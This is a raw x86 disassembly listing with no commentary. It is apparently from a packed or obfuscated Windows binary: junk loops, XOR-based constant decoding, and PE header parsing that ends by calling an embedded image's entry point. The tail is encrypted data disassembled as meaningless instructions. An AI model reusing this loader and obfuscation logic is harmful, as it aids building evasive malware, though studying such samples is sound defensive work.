  409ddb:	mov    edx,DWORD PTR [ebp-0xc]
  409dde:	cmp    ecx,DWORD PTR [edx]
  409de0:	jne    0x40a327
  409de6:	inc    eax
  409de7:	mov    DWORD PTR ds:0x4235bf,0x6f03
  409df1:	cmp    eax,0x4
  409df4:	jb     0x409d43
  409dfa:	xor    eax,eax
  409dfc:	sbb    DWORD PTR ds:0x412360,edx
  409e02:	shl    DWORD PTR [ebp-0x4],1
  409e05:	and    DWORD PTR [ebp-0x4],edi
  409e08:	mov    ecx,DWORD PTR [ebp-0x4]
  409e0b:	and    DWORD PTR ds:0x417e4d,0x0
  409e15:	mov    edx,DWORD PTR ds:0x417e4d
  409e1b:	inc    edx
  409e1c:	mov    DWORD PTR ds:0x417e4d,edx
  409e22:	cmp    DWORD PTR ds:0x417e4d,0xa
  409e29:	jne    0x409e4c
  409e2f:	push   DWORD PTR [ebp-0x20]
  409e32:	push   0x8411
  409e37:	push   0x41ad5b
  409e3c:	push   0x41adfd
  409e41:	push   0x1dc1
  409e46:	call   DWORD PTR ds:0x40d010
  409e4c:	cmp    DWORD PTR ds:0x417e4d,0x9
  409e53:	jne    0x409e68
  409e59:	xor    edx,edx
  409e5b:	or     edx,DWORD PTR ds:0x417e4d
  409e61:	inc    edx
  409e62:	mov    DWORD PTR ds:0x417e4d,edx
  409e68:	cmp    DWORD PTR ds:0x417e4d,0x19
  409e6f:	jb     0x409e15
  409e75:	mov    edx,DWORD PTR ds:0x417eaa
  409e7b:	mov    edx,DWORD PTR [edx]
  409e7d:	xor    DWORD PTR ds:0x41abda,edx
  409e83:	imul   ecx,ecx,0x7f659e30
  409e89:	mov    edx,DWORD PTR ds:0x412374
  409e8f:	sub    DWORD PTR ds:0x415111,edx
  409e95:	mov    DWORD PTR [ebp-0x4],ecx
  409e98:	and    edx,edx
  409e9a:	or     DWORD PTR [ebp-0x4],esi
  409e9d:	mov    ecx,DWORD PTR [ebp-0x4]
  409ea0:	mov    edx,DWORD PTR [ebp-0xc]
  409ea3:	mov    DWORD PTR ds:0x4235cb,0xa9e
  409ead:	cmp    ecx,DWORD PTR [edx]
  409eaf:	jne    0x40a327
  409eb5:	mov    DWORD PTR ds:0x4150fd,0x72ef
  409ebf:	inc    eax
  409ec0:	cmp    eax,0x4
  409ec3:	mov    DWORD PTR ds:0x412370,0x6303
  409ecd:	jb     0x409dfc
  409ed3:	xor    eax,eax
  409ed5:	and    DWORD PTR ds:0x4150fd,0x0
  409edf:	xor    ecx,ecx
  409ee1:	add    ecx,DWORD PTR ds:0x4150fd
  409ee7:	inc    ecx
  409ee8:	mov    DWORD PTR ds:0x4150fd,ecx
  409eee:	cmp    DWORD PTR ds:0x4150fd,0x28
  409ef5:	jne    0x409f04
  409efb:	push   DWORD PTR [ebp-0x24]
  409efe:	call   DWORD PTR ds:0x40d014
  409f04:	cmp    DWORD PTR ds:0x4150fd,0x18
  409f0b:	jb     0x409edf
  409f11:	add    DWORD PTR ds:0x417e59,0x412378
  409f1b:	shl    DWORD PTR [ebp-0x4],1
  409f1e:	and    DWORD PTR [ebp-0x4],edi
  409f21:	and    DWORD PTR ds:0x412360,0x0
  409f2b:	jmp    0x409f3f
  409f30:	xor    edx,edx
  409f32:	or     edx,DWORD PTR ds:0x412360
  409f38:	inc    edx
  409f39:	mov    DWORD PTR ds:0x412360,edx
  409f3f:	cmp    DWORD PTR ds:0x412360,0x11
  409f46:	jae    0x409f85
  409f4c:	cmp    DWORD PTR ds:0x412360,0x1a
  409f53:	jne    0x409f80
  409f59:	push   0x415119
  409f5e:	push   0x8b4a
  409f63:	push   DWORD PTR [ebp-0x24]
  409f66:	push   0x89fe
  409f6b:	push   0x7f12
  409f70:	push   0x7c49
  409f75:	push   0x1205
  409f7a:	call   DWORD PTR ds:0x40d200
  409f80:	jmp    0x409f30
  409f85:	mov    ecx,DWORD PTR [ebp-0x4]
  409f88:	imul   ecx,ecx,0x7f659e30
  409f8e:	mov    DWORD PTR [ebp-0x4],ecx
  409f91:	or     DWORD PTR [ebp-0x4],esi
  409f94:	mov    ecx,DWORD PTR [ebp-0x4]
  409f97:	mov    edx,DWORD PTR [ebp-0xc]
  409f9a:	mov    DWORD PTR ds:0x4235c7,0x2f25
  409fa4:	cmp    ecx,DWORD PTR [edx]
  409fa6:	mov    DWORD PTR ds:0x412358,0x1252
  409fb0:	jne    0x40a327
  409fb6:	inc    eax
  409fb7:	cmp    eax,0x4
  409fba:	mov    DWORD PTR ds:0x4235db,0x48e
  409fc4:	jb     0x409ed5
  409fca:	mov    DWORD PTR ds:0x417e55,0x10
  409fd4:	cmp    DWORD PTR ds:0x417e55,0x0
  409fdb:	je     0x40a032
  409fe1:	cmp    DWORD PTR ds:0x417e55,0x19
  409fe8:	jne    0x40a00e
  409fee:	push   DWORD PTR [ebp-0x24]
  409ff1:	push   0x4235db
  409ff6:	push   DWORD PTR [ebp-0x28]
  409ff9:	push   0x41ada3
  409ffe:	push   0x6e83
  40a003:	push   0x54b6
  40a008:	call   DWORD PTR ds:0x40d204
  40a00e:	mov    edx,DWORD PTR ds:0x417e55
  40a014:	dec    edx
  40a015:	mov    DWORD PTR ds:0x417e55,edx
  40a01b:	jmp    0x409fd4
  40a020:	mov    ecx,DWORD PTR ds:0x40eecc
  40a026:	mov    edx,DWORD PTR ds:0x417eba
  40a02c:	sub    ecx,edx
  40a02e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40a032:	xor    eax,eax
  40a034:	shl    DWORD PTR [ebp-0x4],1
  40a037:	and    DWORD PTR [ebp-0x4],edi
  40a03a:	or     ecx,ecx
  40a03c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a03f:	xor    edx,DWORD PTR ds:0x417e51
  40a045:	imul   ecx,ecx,0x7f659e30
  40a04b:	mov    DWORD PTR ds:0x417e49,0x1d
  40a055:	cmp    DWORD PTR ds:0x417e49,0x0
  40a05c:	je     0x40a0b0
  40a062:	cmp    DWORD PTR ds:0x417e49,0x7
  40a069:	jne    0x40a07a
  40a06f:	push   0x45c2
  40a074:	call   DWORD PTR ds:0x40d208
  40a07a:	cmp    DWORD PTR ds:0x417e49,0x8
  40a081:	jne    0x40a094
  40a087:	mov    edx,DWORD PTR ds:0x417e49
  40a08d:	dec    edx
  40a08e:	mov    DWORD PTR ds:0x417e49,edx
  40a094:	mov    edx,DWORD PTR ds:0x417e49
  40a09a:	dec    edx
  40a09b:	mov    DWORD PTR ds:0x417e49,edx
  40a0a1:	jmp    0x40a055
  40a0a6:	adc    DWORD PTR ds:0x417e45,0x449b
  40a0b0:	mov    DWORD PTR [ebp-0x4],ecx
  40a0b3:	or     ecx,edx
  40a0b5:	or     DWORD PTR [ebp-0x4],esi
  40a0b8:	mov    edx,0x1393
  40a0bd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a0c0:	mov    edx,DWORD PTR [ebp-0xc]
  40a0c3:	mov    DWORD PTR ds:0x41abda,0x516c
  40a0cd:	cmp    ecx,DWORD PTR [edx]
  40a0cf:	jne    0x40a327
  40a0d5:	mov    DWORD PTR ds:0x415111,0x4e99
  40a0df:	inc    eax
  40a0e0:	mov    DWORD PTR ds:0x4235d3,0x1c73
  40a0ea:	cmp    eax,0x4
  40a0ed:	jb     0x40a034
  40a0f3:	xor    eax,eax
  40a0f5:	or     DWORD PTR ds:0x41236c,0x38d4
  40a0ff:	shl    DWORD PTR [ebp-0x4],1
  40a102:	and    DWORD PTR [ebp-0x4],edi
  40a105:	and    ecx,DWORD PTR ds:0x417e59
  40a10b:	mov    ecx,DWORD PTR [ebp-0x4]
  40a10e:	adc    DWORD PTR ds:0x4235cf,0x729e
  40a118:	imul   ecx,ecx,0x7f659e30
  40a11e:	adc    edx,0x9b0
  40a124:	mov    DWORD PTR [ebp-0x4],ecx
  40a127:	xor    edx,edx
  40a129:	or     edx,DWORD PTR ds:0x417e55
  40a12f:	xor    DWORD PTR ds:0x4235d7,edx
  40a135:	or     DWORD PTR [ebp-0x4],esi
  40a138:	mov    ecx,DWORD PTR [ebp-0x4]
  40a13b:	mov    edx,DWORD PTR [ebp-0xc]
  40a13e:	mov    DWORD PTR ds:0x4235c7,0xce5
  40a148:	cmp    ecx,DWORD PTR [edx]
  40a14a:	jne    0x40a327
  40a150:	mov    DWORD PTR ds:0x41abd6,0x18a3
  40a15a:	inc    eax
  40a15b:	mov    DWORD PTR ds:0x4235bf,0x5769
  40a165:	cmp    eax,0x4
  40a168:	mov    DWORD PTR ds:0x412358,0x5fb5
  40a172:	jb     0x40a0f5
  40a178:	sbb    ecx,DWORD PTR ds:0x417e59
  40a17e:	xor    eax,eax
  40a180:	mov    DWORD PTR ds:0x412360,0x14
  40a18a:	cmp    DWORD PTR ds:0x412360,0x0
  40a191:	je     0x40a1c1
  40a197:	cmp    DWORD PTR ds:0x412360,0x19
  40a19e:	jne    0x40a1af
  40a1a4:	push   0x2f20
  40a1a9:	call   DWORD PTR ds:0x40d018
  40a1af:	mov    edx,DWORD PTR ds:0x412360
  40a1b5:	dec    edx
  40a1b6:	mov    DWORD PTR ds:0x412360,edx
  40a1bc:	jmp    0x40a18a
  40a1c1:	shl    DWORD PTR [ebp-0x4],1
  40a1c4:	mov    DWORD PTR ds:0x41abe2,0x14
  40a1ce:	cmp    DWORD PTR ds:0x41abe2,0x0
  40a1d5:	je     0x40a233
  40a1db:	cmp    DWORD PTR ds:0x41abe2,0x5
  40a1e2:	jne    0x40a203
  40a1e8:	push   0x1b4e
  40a1ed:	push   DWORD PTR [ebp-0x1c]
  40a1f0:	push   0x1704
  40a1f5:	push   0x41abf4
  40a1fa:	push   DWORD PTR [ebp-0x10]
  40a1fd:	call   DWORD PTR ds:0x40d01c
  40a203:	cmp    DWORD PTR ds:0x41abe2,0x6
  40a20a:	jne    0x40a21d
  40a210:	mov    edx,DWORD PTR ds:0x41abe2
  40a216:	dec    edx
  40a217:	mov    DWORD PTR ds:0x41abe2,edx
  40a21d:	xor    edx,edx
  40a21f:	add    edx,DWORD PTR ds:0x41abe2
  40a225:	dec    edx
  40a226:	mov    DWORD PTR ds:0x41abe2,edx
  40a22c:	jmp    0x40a1ce
  40a231:	neg    edx
  40a233:	and    DWORD PTR [ebp-0x4],edi
  40a236:	mov    ecx,DWORD PTR [ebp-0x4]
  40a239:	neg    edx
  40a23b:	imul   ecx,ecx,0x7f659e30
  40a241:	xor    edx,DWORD PTR ds:0x41abd2
  40a247:	mov    DWORD PTR [ebp-0x4],ecx
  40a24a:	adc    DWORD PTR ds:0x4235c7,ebx
  40a250:	or     DWORD PTR [ebp-0x4],esi
  40a253:	mov    edx,0x77ca
  40a258:	mov    ecx,DWORD PTR [ebp-0x4]
  40a25b:	mov    edx,DWORD PTR [ebp-0xc]
  40a25e:	mov    DWORD PTR ds:0x41510d,0x1bcb
  40a268:	cmp    ecx,DWORD PTR [edx]
  40a26a:	mov    DWORD PTR ds:0x412354,0x3513
  40a274:	jne    0x40a327
  40a27a:	inc    eax
  40a27b:	cmp    eax,0x4
  40a27e:	mov    DWORD PTR ds:0x417e49,0x110e
  40a288:	jb     0x40a180
  40a28e:	xor    eax,eax
  40a290:	shl    DWORD PTR [ebp-0x4],1
  40a293:	and    DWORD PTR [ebp-0x4],edi
  40a296:	mov    ecx,DWORD PTR [ebp-0x4]
  40a299:	imul   ecx,ecx,0x7f659e30
  40a29f:	mov    DWORD PTR [ebp-0x4],ecx
  40a2a2:	or     DWORD PTR [ebp-0x4],esi
  40a2a5:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a8:	mov    edx,DWORD PTR [ebp-0xc]
  40a2ab:	cmp    ecx,DWORD PTR [edx]
  40a2ad:	jne    0x40a327
  40a2b3:	inc    eax
  40a2b4:	cmp    eax,0x4
  40a2b7:	jb     0x40a290
  40a2bd:	inc    ebx
  40a2be:	cmp    ebx,0x10
  40a2c1:	jb     0x409b50
  40a2c7:	mov    ebx,0xf89c8538
  40a2cc:	mov    DWORD PTR [ebp-0xc],ebx
  40a2cf:	mov    DWORD PTR [ebp-0x8],0xf89c853b
  40a2d6:	lea    eax,[ebp-0x1c]
  40a2d9:	mov    DWORD PTR [ebp-0x18],eax
  40a2dc:	lea    eax,[ebp-0x20]
  40a2df:	mov    DWORD PTR [ebp-0x10],eax
  40a2e2:	mov    eax,ds:0x40d5d0
  40a2e7:	mov    eax,DWORD PTR [eax+0x1c8]
  40a2ed:	mov    eax,DWORD PTR [eax]
  40a2ef:	mov    ecx,DWORD PTR [ebp-0x10]
  40a2f2:	mov    esi,0x7510859
  40a2f7:	xor    eax,esi
  40a2f9:	mov    edi,0x32729f
  40a2fe:	add    eax,edi
  40a300:	mov    DWORD PTR [ecx],eax
  40a302:	mov    eax,ds:0x40d854
  40a307:	cmp    eax,0x23d14057
  40a30c:	mov    eax,DWORD PTR [ebp-0x8]
  40a30f:	je     0x40a32e
  40a315:	mov    ecx,DWORD PTR [ebp-0xc]
  40a318:	xor    eax,esi
  40a31a:	add    eax,edi
  40a31c:	imul   eax,ecx
  40a31f:	mov    DWORD PTR [ebp-0xc],eax
  40a322:	jmp    0x40a371
  40a327:	xor    eax,eax
  40a329:	jmp    0x40a5d0
  40a32e:	xor    eax,esi
  40a330:	add    eax,edi
  40a332:	mov    ds:0x40d6e0,eax
  40a337:	mov    eax,DWORD PTR [ebp-0xc]
  40a33a:	xor    eax,esi
  40a33c:	add    eax,edi
  40a33e:	mov    ds:0x40d854,eax
  40a343:	mov    eax,DWORD PTR [ebp-0x8]
  40a346:	mov    ecx,DWORD PTR ds:0x40d6e0
  40a34c:	xor    eax,esi
  40a34e:	add    eax,edi
  40a350:	cmp    ecx,eax
  40a352:	jne    0x40a371
  40a358:	push   0x40d72c
  40a35d:	call   DWORD PTR ds:0x40d1ec
  40a363:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a369:	mov    ecx,DWORD PTR [ecx+0x198]
  40a36f:	mov    DWORD PTR [ecx],eax
  40a371:	mov    eax,ds:0x40d5d0
  40a376:	mov    eax,DWORD PTR [eax+0x18c]
  40a37c:	mov    eax,DWORD PTR [eax]
  40a37e:	mov    DWORD PTR [ebp-0x24],eax
  40a381:	mov    eax,0xf89c853c
  40a386:	mov    DWORD PTR [ebp-0x28],eax
  40a389:	mov    DWORD PTR [ebp-0x28],eax
  40a38c:	mov    DWORD PTR [ebp-0x28],eax
  40a38f:	mov    DWORD PTR [ebp-0x10],ebx
  40a392:	mov    DWORD PTR [ebp-0x28],eax
  40a395:	mov    DWORD PTR [ebp-0x28],0xf89c8530
  40a39c:	mov    ebx,DWORD PTR [ebp-0xc]
  40a39f:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3a2:	mov    edx,DWORD PTR [ebp-0x8]
  40a3a5:	xor    edx,esi
  40a3a7:	xor    ecx,esi
  40a3a9:	add    ecx,edx
  40a3ab:	mov    edx,DWORD PTR [ebp-0x8]
  40a3ae:	xor    ebx,esi
  40a3b0:	xor    edx,esi
  40a3b2:	add    ebx,edi
  40a3b4:	lea    ecx,[ecx+edx*1+0x9757dd]
  40a3bb:	cmp    ebx,ecx
  40a3bd:	ja     0x40a41e
  40a3c3:	mov    eax,DWORD PTR [ebp-0x8]
  40a3c6:	xor    eax,esi
  40a3c8:	lea    eax,[eax+ebx*1+0x32729f]
  40a3cf:	push   eax
  40a3d0:	mov    eax,DWORD PTR [ebp-0x10]
  40a3d3:	xor    eax,esi
  40a3d5:	lea    eax,[ebp+eax*1+0x3272a7]
  40a3dc:	push   eax
  40a3dd:	mov    eax,ds:0x40d5d0
  40a3e2:	push   DWORD PTR [eax+0x1bc]
  40a3e8:	call   0x40742d
  40a3ed:	mov    eax,DWORD PTR [ebp-0x8]
  40a3f0:	xor    eax,esi
  40a3f2:	lea    ebx,[ebx+eax*1+0x32729f]
  40a3f9:	mov    eax,DWORD PTR [ebp-0x8]
  40a3fc:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3ff:	xor    ecx,esi
  40a401:	xor    eax,esi
  40a403:	add    eax,ecx
  40a405:	mov    ecx,DWORD PTR [ebp-0x8]
  40a408:	xor    ecx,esi
  40a40a:	lea    eax,[eax+ecx*1+0x9757dd]
  40a411:	cmp    ebx,eax
  40a413:	jbe    0x40a3c3
  40a419:	mov    eax,0xf89c853c
  40a41e:	mov    ecx,DWORD PTR [ebp+0xc]
  40a421:	mov    DWORD PTR ds:0x40d454,ecx
  40a427:	mov    ecx,DWORD PTR [ebp+0x10]
  40a42a:	mov    DWORD PTR ds:0x40d6a8,ecx
  40a430:	mov    ecx,DWORD PTR ds:0x40d454
  40a436:	mov    edx,DWORD PTR [ebp-0x18]
  40a439:	sub    ecx,edi
  40a43b:	xor    ecx,esi
  40a43d:	mov    DWORD PTR [edx],ecx
  40a43f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a442:	cmp    ecx,0xf89c853b
  40a448:	je     0x40a4a5
  40a44e:	mov    ecx,DWORD PTR [ebp-0xc]
  40a451:	mov    edx,DWORD PTR [ebp-0x20]
  40a454:	xor    ecx,esi
  40a456:	add    ecx,edi
  40a458:	cmp    ecx,edx
  40a45a:	je     0x40a4a5
  40a460:	mov    eax,ds:0x40d5d0
  40a465:	mov    eax,DWORD PTR [eax+0x194]
  40a46b:	mov    ecx,DWORD PTR [eax]
  40a46d:	mov    eax,DWORD PTR [ecx+0x3c]
  40a470:	push   DWORD PTR ds:0x40d6a8
  40a476:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a47a:	push   DWORD PTR ds:0x40d454
  40a480:	add    eax,ecx
  40a482:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a488:	mov    ecx,DWORD PTR [ecx+0x194]
  40a48e:	push   DWORD PTR [ecx]
  40a490:	call   eax
  40a492:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a498:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a49e:	mov    DWORD PTR [ecx],eax
  40a4a0:	jmp    0x40a5b5
  40a4a5:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4a8:	mov    edx,DWORD PTR [ebp-0x24]
  40a4ab:	xor    ecx,esi
  40a4ad:	add    ecx,edi
  40a4af:	cmp    ecx,edx
  40a4b1:	jne    0x40a598
  40a4b7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4ba:	xor    ecx,esi
  40a4bc:	add    ecx,edi
  40a4be:	mov    DWORD PTR ds:0x40d654,ecx
  40a4c4:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4c7:	xor    ecx,esi
  40a4c9:	add    ecx,edi
  40a4cb:	mov    DWORD PTR ds:0x40d64c,ecx
  40a4d1:	mov    ecx,DWORD PTR [ebp-0x8]
  40a4d4:	mov    DWORD PTR [ebp-0x10],ecx
  40a4d7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4da:	mov    DWORD PTR [ebp+0xc],ecx
  40a4dd:	mov    ecx,DWORD PTR [ebp+0xc]
  40a4e0:	xor    ecx,esi
  40a4e2:	add    ecx,edi
  40a4e4:	mov    DWORD PTR [ebp+0xc],ecx
  40a4e7:	mov    ecx,DWORD PTR ds:0x40d450
  40a4ed:	mov    ecx,DWORD PTR [ecx]
  40a4ef:	mov    DWORD PTR [ebp+0xc],ecx
  40a4f2:	mov    ecx,DWORD PTR ds:0x40d658
  40a4f8:	mov    ecx,DWORD PTR [ecx]
  40a4fa:	mov    DWORD PTR [ebp-0x18],ecx
  40a4fd:	mov    DWORD PTR [ebp+0x10],0xf89c8738
  40a504:	mov    ecx,DWORD PTR [ebp+0x10]
  40a507:	xor    ecx,esi
  40a509:	add    ecx,edi
  40a50b:	mov    DWORD PTR [ebp+0x10],ecx
  40a50e:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a514:	mov    DWORD PTR [ebp+0x10],ecx
  40a517:	mov    ecx,DWORD PTR [ebp+0xc]
  40a51a:	mov    DWORD PTR [ebp+0xc],ecx
  40a51d:	mov    ecx,DWORD PTR [ebp+0xc]
  40a520:	push   0x4
  40a522:	pop    edx
  40a523:	sub    edx,ecx
  40a525:	add    edx,DWORD PTR [ebp-0x18]
  40a528:	mov    DWORD PTR [ebp-0x28],0xf89c85f8
  40a52f:	mov    DWORD PTR [ebp+0x10],edx
  40a532:	mov    DWORD PTR [ebp-0x74],eax
  40a535:	mov    eax,DWORD PTR [ebp+0xc]
  40a538:	mov    DWORD PTR [ebp-0x70],eax
  40a53b:	mov    eax,DWORD PTR [ebp+0x10]
  40a53e:	mov    DWORD PTR [ebp-0x6c],eax
  40a541:	mov    eax,DWORD PTR [ebp-0x28]
  40a544:	xor    eax,esi
  40a546:	add    eax,edi
  40a548:	mov    DWORD PTR [ebp-0x68],eax
  40a54b:	lea    eax,[ebp-0x30]
  40a54e:	mov    DWORD PTR [ebp-0x64],eax
  40a551:	mov    eax,DWORD PTR [ebp-0x74]
  40a554:	xor    eax,esi
  40a556:	add    eax,edi
  40a558:	mov    DWORD PTR [ebp-0x74],eax
  40a55b:	lea    eax,[ebp-0x74]
  40a55e:	push   eax
  40a55f:	mov    eax,DWORD PTR [ebp-0x10]
  40a562:	xor    eax,esi
  40a564:	add    eax,edi
  40a566:	push   eax
  40a567:	mov    eax,ds:0x40d5f0
  40a56c:	push   0x40d546
  40a571:	push   DWORD PTR [eax]
  40a573:	call   0x40ae4d
  40a578:	xor    esi,esi
  40a57a:	mov    eax,DWORD PTR [ebp+0x10]
  40a57d:	sub    eax,esi
  40a57f:	push   eax
  40a580:	mov    eax,DWORD PTR [ebp+0xc]
  40a583:	add    eax,esi
  40a585:	push   eax
  40a586:	call   0x4059cb
  40a58b:	inc    esi
  40a58c:	cmp    esi,0x52
  40a58f:	jb     0x40a57a
  40a595:	mov    eax,DWORD PTR [ebp-0x10]
  40a598:	call   0x404704
  40a59d:	lea    eax,[ebp+0x4]
  40a5a0:	mov    DWORD PTR [ebp-0x2c],eax
  40a5a3:	mov    eax,DWORD PTR [ebp-0x14]
  40a5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40a5a9:	push   DWORD PTR [ebp-0xc]
  40a5ac:	lea    eax,[ebp-0x2c]
  40a5af:	push   eax
  40a5b0:	call   0x407c0a
  40a5b5:	mov    eax,ds:0x40d5d0
  40a5ba:	push   0x4
  40a5bc:	add    eax,0x1cc
  40a5c1:	push   eax
  40a5c2:	lea    eax,[ebp-0x14]
  40a5c5:	push   eax
  40a5c6:	call   0x40742d
  40a5cb:	mov    eax,DWORD PTR [ebp-0x14]
  40a5ce:	mov    eax,DWORD PTR [eax]
  40a5d0:	pop    edi
  40a5d1:	pop    esi
  40a5d2:	pop    ebx
  40a5d3:	leave  
  40a5d4:	ret    0xc
  40a5d7:	push   ebp
  40a5d8:	mov    ebp,esp
  40a5da:	sub    esp,0x14
  40a5dd:	leave  
  40a5de:	ret    0x4
  40a5e1:	push   ebp
  40a5e2:	mov    ebp,esp
  40a5e4:	push   ecx
  40a5e5:	or     eax,0x5cec
  40a5ea:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40a5f1:	add    eax,0x77b5
  40a5f6:	mov    eax,DWORD PTR [ebp+0x8]
  40a5f9:	mov    al,BYTE PTR [eax]
  40a5fb:	add    DWORD PTR ds:0x412354,0x2449
  40a605:	add    al,0x34
  40a607:	sbb    DWORD PTR ds:0x41237c,0x412364
  40a611:	xor    al,0x4a
  40a613:	cmp    al,0xcb
  40a615:	mov    DWORD PTR ds:0x4235d3,0x6064
  40a61f:	jne    0x40a6b9
  40a625:	mov    eax,DWORD PTR [ebp+0x8]
  40a628:	mov    ecx,DWORD PTR [ebp+0x8]
  40a62b:	add    ecx,DWORD PTR [eax+0x3c]
  40a62e:	mov    edx,0x7510859
  40a633:	and    DWORD PTR ds:0x412368,0x0
  40a63d:	mov    eax,ds:0x412368
  40a642:	inc    eax
  40a643:	mov    ds:0x412368,eax
  40a648:	cmp    DWORD PTR ds:0x412368,0xe
  40a64f:	jne    0x40a663
  40a655:	push   0x41236c
  40a65a:	push   DWORD PTR [ebp-0x10]
  40a65d:	call   DWORD PTR ds:0x40d398
  40a663:	cmp    DWORD PTR ds:0x412368,0xd
  40a66a:	jne    0x40a67b
  40a670:	mov    eax,ds:0x412368
  40a675:	inc    eax
  40a676:	mov    ds:0x412368,eax
  40a67b:	cmp    DWORD PTR ds:0x412368,0x1f
  40a682:	jb     0x40a63d
  40a688:	mov    DWORD PTR [ebp+0x8],ecx
  40a68b:	mov    eax,DWORD PTR [ebp-0x4]
  40a68e:	xor    eax,edx
  40a690:	push   esi
  40a691:	mov    esi,DWORD PTR [ebp+0x8]
  40a694:	mov    ecx,0x32729f
  40a699:	add    eax,ecx
  40a69b:	cmp    DWORD PTR [esi+0x54],eax
  40a69e:	pop    esi
  40a69f:	je     0x40a6ad
  40a6a5:	mov    eax,DWORD PTR [ebp+0x8]
  40a6a8:	jmp    0x40a6c6
  40a6ad:	mov    eax,DWORD PTR [ebp-0x4]
  40a6b0:	xor    eax,edx
  40a6b2:	add    eax,ecx
  40a6b4:	jmp    0x40a6c6
  40a6b9:	mov    eax,DWORD PTR [ebp-0x4]
  40a6bc:	xor    eax,0x7510859
  40a6c1:	add    eax,0x32729f
  40a6c6:	leave  
  40a6c7:	ret    0x4
  40a6ca:	push   ebp
  40a6cb:	mov    ebp,esp
  40a6cd:	push   ecx
  40a6ce:	mov    DWORD PTR ds:0x417e41,0x1a
  40a6d8:	cmp    DWORD PTR ds:0x417e41,0x0
  40a6df:	je     0x40a739
  40a6e5:	cmp    DWORD PTR ds:0x417e41,0x4
  40a6ec:	jne    0x40a70f
  40a6f2:	push   0x6416
  40a6f7:	push   0x57a6
  40a6fc:	push   0x7327
  40a701:	push   DWORD PTR [ebp-0xc]
  40a704:	push   0x1809
  40a709:	call   DWORD PTR ds:0x40d39c
  40a70f:	cmp    DWORD PTR ds:0x417e41,0x5
  40a716:	jne    0x40a727
  40a71c:	mov    eax,ds:0x417e41
  40a721:	dec    eax
  40a722:	mov    ds:0x417e41,eax
  40a727:	mov    eax,ds:0x417e41
  40a72c:	dec    eax
  40a72d:	mov    ds:0x417e41,eax
  40a732:	jmp    0x40a6d8
  40a737:	sub    edx,edx
  40a739:	push   ecx
  40a73a:	sub    edx,eax
  40a73c:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40a743:	and    DWORD PTR ds:0x412358,0x0
  40a74d:	jmp    0x40a761
  40a752:	xor    edx,edx
  40a754:	add    edx,DWORD PTR ds:0x412358
  40a75a:	inc    edx
  40a75b:	mov    DWORD PTR ds:0x412358,edx
  40a761:	cmp    DWORD PTR ds:0x412358,0x11
  40a768:	jae    0x40a79c
  40a76e:	cmp    DWORD PTR ds:0x412358,0x18
  40a775:	jne    0x40a791
  40a77b:	push   0x4012
  40a780:	push   DWORD PTR [ebp-0xc]
  40a783:	push   0x7b7f
  40a788:	push   DWORD PTR [ebp-0xc]
  40a78b:	call   DWORD PTR ds:0x40d020
  40a791:	jmp    0x40a752
  40a796:	sub    DWORD PTR ds:0x4235bf,ebx
  40a79c:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  40a7a3:	jmp    0x40a91b
  40a7a8:	(bad)  
  40a7a9:	jmp    0x40a73d
  40a7ab:	aam    0x78
  40a7ad:	push   ebp
  40a7ae:	pop    ecx
  40a7af:	jnp    0x40a756
  40a7b1:	fwait
  40a7b2:	jne    0x40a830
  40a7b4:	(bad)  
  40a7b5:	mov    ebx,0x25052be4
  40a7ba:	jle    0x40a83a
  40a7bc:	lds    edi,FWORD PTR [edi+0x7e]
  40a7bf:	jle    0x40a763
  40a7c1:	push   ebx
  40a7c2:	and    edx,DWORD PTR [ebx]
  40a7c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7c5:	jge    0x40a79e
  40a7c7:	sub    eax,0x7f4faf9b
  40a7cc:	das    
  40a7cd:	test   DWORD PTR [eax],ebp
  40a7cf:	add    DWORD PTR [ebx-0x55],ebx
  40a7d2:	mov    ecx,0x37c91438
  40a7d7:	cmp    al,0x88
  40a7d9:	and    ch,dl
  40a7db:	test   DWORD PTR [edx],0x97da8103
  40a7e1:	fdivr  DWORD PTR [ecx-0x2c975fa6]
  40a7e7:	je     0x40a783
  40a7e9:	mov    eax,0x4851f663
  40a7ee:	sar    cl,cl
  40a7f0:	push   edi
  40a7f1:	mov    ebx,0x959745a1
  40a7f6:	jle    0x40a78e
  40a7f8:	loop   0x40a83c
  40a7fa:	jmp    0x4621:0x5282d54a
  40a801:	cmp    BYTE PTR [esi],0x78
  40a804:	sub    al,0xda
  40a806:	call   0x85ca2c99
  40a80b:	stc    
  40a80c:	adc    BYTE PTR [ebx+0x2d],ah
  40a80f:	xchg   esi,eax
  40a810:	cmp    ebx,eax
  40a812:	pop    edx
  40a813:	and    BYTE PTR [eax+0x5301c2b2],ch
  40a819:	pop    esi
  40a81a:	xlat   BYTE PTR ds:[ebx]
  40a81b:	or     eax,edi
  40a81d:	cmp    bh,0x11
  40a820:	mov    esi,0x9af336b1
  40a825:	aam    0xf5
  40a827:	adc    DWORD PTR ss:[edx+ebp*2-0x64467a86],esp
  40a82f:	push   ebx
  40a830:	sub    DWORD PTR ds:0x47761185,esi
  40a836:	xor    BYTE PTR ds:0xe7c18891,0xc7
  40a83d:	imul   esi,edx,0xfffffff1
  40a840:	jmp    0x780de172
  40a845:	dec    ebp
  40a846:	mov    dl,bl
  40a848:	mov    ah,0xc2
  40a84a:	sti    
  40a84b:	ins    BYTE PTR es:[edi],dx
  40a84c:	adc    al,0x8c
  40a84e:	mov    ah,0x6d
  40a850:	cs xchg ebp,eax
  40a852:	out    dx,al
  40a853:	dec    ebx
  40a854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a855:	es mov ebx,0x8b3a6646
